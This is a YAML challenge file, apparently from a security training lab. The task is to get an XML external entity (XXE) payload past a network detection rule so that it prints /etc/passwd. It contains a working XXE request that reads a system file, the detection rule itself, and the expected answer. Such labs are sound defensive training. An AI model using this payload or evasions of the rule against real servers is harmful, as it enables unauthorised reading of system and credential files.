name: 'XML eXternal Entities (XXE) 2'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print /etc/passwd**

hints: []

target:
  dev:
    host: localhost
    port: 10008
  prod:
    host: detector
    port: 80

base_request: |-
  POST / HTTP/1.1
  Host: localhost
  Connection: keep-alive
  Content-Length: auto
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybBYvkB2ohiOQdWxB

  ------WebKitFormBoundarybBYvkB2ohiOQdWxB
  Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
  Content-Type: text/xml

  <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE draconis [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <dragons>
       <dragon>
         <name>Smaug</name>
         <proof>&xxe;</proof>
       </dragon>
     </dragons>

  ------WebKitFormBoundarybBYvkB2ohiOQdWxB--

rules:
# Matching <?xml (optional)
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "<?xml"; content: "<!ENTITY"; sid:123456; rev:1;)

expected_output: "root:"
